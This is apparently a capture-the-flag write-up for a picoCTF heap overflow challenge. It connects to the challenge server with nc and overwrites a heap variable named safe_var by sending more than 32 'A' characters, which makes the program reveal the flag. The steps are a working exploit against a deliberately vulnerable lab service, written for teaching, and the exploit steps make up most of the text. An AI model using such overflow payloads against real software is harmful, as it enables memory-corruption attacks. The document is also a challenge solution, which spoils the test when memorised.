## Hints
- What part of the heap do you have control over and how far is it from the safe_var?

## Analysis




---

## Methodology
**Step 1:** Connect to the service

nc tethys.picoctf.net 58286
The program immediately prints the two heap addresses, letting us measure the distance between them.

**Step 2:** Overflow input_data

Choose option 2:

2


Then enter a payload larger than 32 bytes:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


This overwrites safe_var.

**Step 3:** Trigger the flag check

4
Since safe_var != "bico" now:

strcmp() fails

program prints “YOU WIN”

flag is revealed
